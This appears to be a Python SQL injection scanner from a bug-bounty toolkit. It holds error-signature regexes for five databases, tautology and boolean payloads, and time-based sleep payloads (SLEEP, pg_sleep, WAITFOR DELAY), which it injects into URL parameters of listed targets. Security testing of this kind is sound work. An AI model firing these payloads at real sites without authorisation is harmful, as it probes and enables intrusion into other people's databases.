#!/usr/bin/env python3
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

ERROR_PATTERNS = {
    "MySQL": [
        re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
        re.compile(r"Warning.*mysql_.*", re.IGNORECASE),
        re.compile(r"MySQLSyntaxErrorException", re.IGNORECASE),
        re.compile(r"valid MySQL result", re.IGNORECASE),
        re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.IGNORECASE),
        re.compile(r"mysqli_", re.IGNORECASE),
        re.compile(r"Column count doesn't match value count", re.IGNORECASE),
        re.compile(r"mysql_fetch", re.IGNORECASE),
    ],
    "PostgreSQL": [
        re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
        re.compile(r"Warning.*\Wpg_.*", re.IGNORECASE),
        re.compile(r"valid PostgreSQL result", re.IGNORECASE),
        re.compile(r"PG::([a-zA-Z]+Error)", re.IGNORECASE),
        re.compile(r"ERROR:\s+invalid input syntax for", re.IGNORECASE),
        re.compile(r"psql:", re.IGNORECASE),
        re.compile(r"pg_query", re.IGNORECASE),
        re.compile(r"pg_exec", re.IGNORECASE),
    ],
    "MSSQL": [
        re.compile(r"Microsoft OLE DB.*SQL Server", re.IGNORECASE),
        re.compile(r"Driver.*SQL[\s_\-\[]*Server", re.IGNORECASE),
        re.compile(r"SQL Server.*Driver", re.IGNORECASE),
        re.compile(r"ODBC SQL Server Driver", re.IGNORECASE),
        re.compile(r"SQLServer JDBC Driver", re.IGNORECASE),
        re.compile(r"SQL\s*Server.*\[SQL Server\]", re.IGNORECASE),
        re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
        re.compile(r"Incorrect syntax near", re.IGNORECASE),
        re.compile(r"Procedure .* expects parameter", re.IGNORECASE),
        re.compile(r"mssql_", re.IGNORECASE),
    ],
    "Oracle": [
        re.compile(r"Oracle error", re.IGNORECASE),
        re.compile(r"Oracle.*Driver", re.IGNORECASE),
        re.compile(r"ORA-\d{4,5}", re.IGNORECASE),
        re.compile(r"Oracle.*Warning", re.IGNORECASE),
        re.compile(r"Oracle.*PL/SQL", re.IGNORECASE),
        re.compile(r"quoted string not properly terminated", re.IGNORECASE),
        re.compile(r"oci_", re.IGNORECASE),
        re.compile(r"SQL command not properly ended", re.IGNORECASE),
    ],
    "SQLite": [
        re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
        re.compile(r"SQLiteException", re.IGNORECASE),
        re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE),
        re.compile(r"unrecognized token:", re.IGNORECASE),
        re.compile(r"near\s+\"[^\"]*\".*syntax error", re.IGNORECASE),
        re.compile(r"sqlite3_", re.IGNORECASE),
    ],
}

GENERIC_ERROR_PATTERNS = [
    re.compile(r"SQL syntax", re.IGNORECASE),
    re.compile(r"SQL error", re.IGNORECASE),
    re.compile(r"database error", re.IGNORECASE),
    re.compile(r"query failed", re.IGNORECASE),
    re.compile(r"unhandled exception.*sql", re.IGNORECASE),
    re.compile(r"JDBCException", re.IGNORECASE),
    re.compile(r"ADODB\.Exception", re.IGNORECASE),
    re.compile(r"PDOException", re.IGNORECASE),
    re.compile(r"DBD::", re.IGNORECASE),
    re.compile(r"DBI connect", re.IGNORECASE),
]

SQLI_PAYLOADS = [
    {"payload": "'", "name": "single_quote", "technique": "error"},
    {"payload": '"', "name": "double_quote", "technique": "error"},
    {"payload": "\\", "name": "backslash_escape", "technique": "error"},
    {"payload": "' OR '1'='1", "name": "or_tautology_single", "technique": "boolean"},
    {"payload": '" OR "1"="1', "name": "or_tautology_double", "technique": "boolean"},
    {"payload": "' OR '1'='1' -- ", "name": "or_tautology_comment", "technique": "boolean"},
    {"payload": "' AND '1'='1", "name": "and_true_single", "technique": "boolean"},
    {"payload": "' AND '1'='2", "name": "and_false_single", "technique": "boolean"},
    {"payload": "' OR 1=1 -- ", "name": "numeric_tautology", "technique": "boolean"},
    {"payload": "1' AND '1'='1", "name": "and_true_double", "technique": "boolean"},
    {"payload": "1' AND '1'='2", "name": "and_false_double", "technique": "boolean"},
]


TIME_BASED_PAYLOADS = {
    "MySQL": [
        {"payload": "' OR SLEEP(5) -- ", "name": "mysql_sleep", "delay_seconds": 5},
        {"payload": "' OR BENCHMARK(5000000,MD5(1)) -- ", "name": "mysql_benchmark", "delay_seconds": 5},
        {"payload": "' AND SLEEP(5) -- ", "name": "mysql_and_sleep", "delay_seconds": 5},
        {"payload": "1' AND SLEEP(5) -- ", "name": "mysql_numeric_sleep", "delay_seconds": 5},
    ],
    "PostgreSQL": [
        {"payload": "' OR pg_sleep(5) -- ", "name": "pg_sleep", "delay_seconds": 5},
        {"payload": "'; SELECT pg_sleep(5) -- ", "name": "pg_select_sleep", "delay_seconds": 5},
    ],
    "MSSQL": [
        {"payload": "'; WAITFOR DELAY '00:00:05' -- ", "name": "mssql_waitfor", "delay_seconds": 5},
        {"payload": "' OR WAITFOR DELAY '00:00:05' -- ", "name": "mssql_or_waitfor", "delay_seconds": 5},
    ],
    "Oracle": [
        {"payload": "' OR DBMS_LOCK.SLEEP(5) -- ", "name": "oracle_dbms_lock", "delay_seconds": 5},
    ],
    "SQLite": [
        {"payload": "' OR randomblob(1000000000) -- ", "name": "sqlite_randomblob", "delay_seconds": 3},
        {"payload": "' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) -- ", "name": "sqlite_heavy", "delay_seconds": 3},
    ],
    "Generic": [
        {"payload": "' OR SLEEP(5) -- ", "name": "generic_sleep", "delay_seconds": 5},
    ],
}


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def extract_params_from_url(url):
    params = set()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    for k in query_params:
        params.add(k)
    param_pattern = re.findall(r'[?&]([\w\[\]]+)=', url)
    for p in param_pattern:
        params.add(p)
    return list(params)


def inject_payload(url, param, payload_str):
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in query_params:
        query_params[param] = [payload_str]
    else:
        query_params[param] = [payload_str]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    parts = list(parsed)
    parts[4] = new_query
    return urllib.parse.urlunparse(parts)


def detect_db_type(response_text, error_obj=None):
    for db_type, patterns in ERROR_PATTERNS.items():
        if response_text:
            for pattern in patterns:
                if pattern.search(response_text):
                    return db_type
    if error_obj and isinstance(error_obj, str):
        for db_type, patterns in ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.search(error_obj):
                    return db_type
    if response_text:
        for pattern in GENERIC_ERROR_PATTERNS:
            if pattern.search(response_text):
                return "Unknown (SQL error detected, DB type uncertain)"
    return "Unknown"


def detect_sqli_error(response_text):
    if not response_text:
        return False
    for pattern in GENERIC_ERROR_PATTERNS:
        if pattern.search(response_text):
            return True
    for patterns in ERROR_PATTERNS.values():
        for pattern in patterns:
            if pattern.search(response_text):
                return True
    return False


def measure_response_time(url, param, session, timeout, reference_time=None):
    try:
        baseline_url = url
        if reference_time is None:
            start = time.time()
            session.get(baseline_url, timeout=timeout, allow_redirects=True)
            reference_time = time.time() - start
    except (requests.exceptions.RequestException, Exception):
        reference_time = 1.0
    return reference_time


def test_sqli_payload(url, param, pdef, session, timeout, rate_limit, context, dry_run):
    result = {
        "url": url,
        "param": param,
        "payload": pdef["payload"],
        "payload_name": pdef["name"],
        "technique": pdef.get("technique", "unknown"),
        "db_type": "Unknown",
        "error_detected": False,
        "error_snippet": None,
        "status_code": 0,
        "response_length": 0,
        "confidence": 0.0,
        "dry_run": dry_run,
    }
    if dry_run:
        test_url = inject_payload(url, param, pdef["payload"])
        print(f"[dry-run] Would test URL={test_url} param={param} technique={pdef.get('technique')}", file=sys.stderr)
        return result
    try:
        test_url = inject_payload(url, param, pdef["payload"])
        resp = session.get(test_url, timeout=timeout, allow_redirects=True)
        result["status_code"] = resp.status_code
        result["response_length"] = len(resp.text)
        has_error = detect_sqli_error(resp.text)
        result["error_detected"] = has_error
        if has_error:
            db_type = detect_db_type(resp.text)
            result["db_type"] = db_type
            for patterns in ERROR_PATTERNS.get(db_type, []) or GENERIC_ERROR_PATTERNS:
                for pattern in ([patterns] if hasattr(patterns, "search") else patterns):
                    try:
                        m = pattern.search(resp.text)
                        if m:
                            start = max(0, m.start() - 40)
                            end = min(len(resp.text), m.end() + 60)
                            result["error_snippet"] = resp.text[start:end]
                            break
                    except TypeError:
                        continue
            result["confidence"] = 0.75 if db_type != "Unknown" else 0.5
            print(f"[error_sqli] {url} param={param} db_type={db_type}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.Timeout:
        result["error_detected"] = False
        result["response_length"] = 0
    except requests.exceptions.ConnectionError as e:
        result["error_detected"] = False
    except requests.exceptions.RequestException as e:
        result["error_detected"] = False
    return result


def test_time_based(url, param, db_type, session, timeout, rate_limit, context, dry_run):
    results = []
    payloads = TIME_BASED_PAYLOADS.get(db_type, TIME_BASED_PAYLOADS["Generic"])
    for pdef in payloads:
        result = {
            "url": url,
            "param": param,
            "payload": pdef["payload"],
            "payload_name": pdef["name"],
            "technique": "time_based",
            "db_type": db_type,
            "time_detected": False,
            "baseline_seconds": 0.0,
            "payload_seconds": 0.0,
            "time_difference": 0.0,
            "threshold_seconds": pdef.get("delay_seconds", 5),
            "confidence": 0.0,
            "dry_run": dry_run,
        }
        if dry_run:
            test_url = inject_payload(url, param, pdef["payload"])
            print(f"[dry-run] Time-based: URL={test_url} param={param} db={db_type}", file=sys.stderr)
            results.append(result)
            continue
        try:
            baseline_url = url
            start = time.time()
            session.get(baseline_url, timeout=timeout, allow_redirects=True)
            baseline = time.time() - start
            result["baseline_seconds"] = round(baseline, 2)
            test_url = inject_payload(url, param, pdef["payload"])
            start = time.time()
            session.get(test_url, timeout=timeout * 2, allow_redirects=True)
            elapsed = time.time() - start
            result["payload_seconds"] = round(elapsed, 2)
            diff = elapsed - baseline
            result["time_difference"] = round(diff, 2)
            threshold = pdef.get("delay_seconds", 5)
            if diff > (threshold * 0.5):
                result["time_detected"] = True
                result["confidence"] = min(0.9, 0.4 + diff / threshold * 0.5)
                print(f"[time_sqli] {url} param={param} diff={diff:.2f}s threshold={threshold}s db={db_type}", file=sys.stderr)
            if rate_limit > 0:
                time.sleep(1.0 / rate_limit)
        except requests.exceptions.Timeout:
            result["time_detected"] = True
            result["confidence"] = 0.6
            result["time_difference"] = float(timeout * 2)
        except requests.exceptions.ConnectionError:
            result["time_detected"] = False
        except requests.exceptions.RequestException:
            result["time_detected"] = False
        results.append(result)
    return results


def main():
    parser = argparse.ArgumentParser(
        description="SQLi Detector — detect SQL injection vulnerabilities via error, boolean, and time-based techniques",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --urls live_urls.txt --context .bb/context.json
  %(prog)s --urls single_url.txt --context .bb/context.json --dry-run
  %(prog)s --urls urls.txt --rate-limit 3 --timeout 15 --no-time-based
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--urls", required=True, help="File with target URLs, one per line")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--rate-limit", type=int, default=5, help="Max requests per second (default: 5)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--concurrency", type=int, default=3, help="Thread pool concurrency (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--no-time-based", action="store_true", help="Skip time-based SQLi detection")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--proxy", default=None, help="HTTP proxy")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    os.makedirs(outdir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "sqli_findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        print("[error] No URLs loaded from --urls file.", file=sys.stderr)
        sys.exit(1)

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy_dict:
        session.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    tasks = []
    for url in urls:
        params = extract_params_from_url(url)
        if not params:
            params = ["id", "page", "cat", "product", "user", "query", "search", "s", "q", "article", "news", "item", "pid", "cid", "uid", "file", "path", "dir", "sort", "order", "filter", "limit", "offset"]
        for param in params:
            for pdef in SQLI_PAYLOADS:
                tasks.append((url, param, pdef))

    print(f"[info] Prepared {len(tasks)} error-based/boolean probe tasks across {len(urls)} URLs", file=sys.stderr)

    all_findings = []
    with open(output_path, "w") as outfile:
        completed = 0
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url, param, pdef in tasks:
                future = executor.submit(
                    test_sqli_payload, url, param, pdef,
                    requests.Session(), args.timeout, args.rate_limit, ctx, args.dry_run
                )
                futures[future] = (url, param, pdef)
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception as e:
                    continue
                outfile.write(json.dumps(result) + "\n")
                completed += 1
                if result.get("error_detected") and result.get("confidence", 0) > 0.3:
                    all_findings.append(result)
                if completed % 100 == 0:
                    print(f"[progress] {completed}/{len(tasks)} error probes", file=sys.stderr)

        if not args.no_time_based:
            time_tasks = []
            for url in urls:
                params = extract_params_from_url(url)
                if not params:
                    params = ["id", "page", "cat", "product", "user", "query", "search", "s", "q"]
                for param in params:
                    for db_type in list(TIME_BASED_PAYLOADS.keys()):
                        time_tasks.append((url, param, db_type))

            print(f"[info] Running {len(time_tasks)} time-based tests", file=sys.stderr)
            time_completed = 0
            for url, param, db_type in time_tasks:
                time_results = test_time_based(
                    url, param, db_type,
                    requests.Session(), args.timeout, args.rate_limit, ctx, args.dry_run
                )
                for tr in time_results:
                    outfile.write(json.dumps(tr) + "\n")
                    if tr.get("time_detected") and tr.get("confidence", 0) > 0.3:
                        all_findings.append(tr)
                time_completed += 1
                if time_completed % 50 == 0:
                    print(f"[progress] {time_completed}/{len(time_tasks)} time-based tests", file=sys.stderr)

    summary = {
        "total_error_probes": len(tasks),
        "time_based_tests": len(time_tasks) if not args.no_time_based else 0,
        "total_findings": len(all_findings),
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()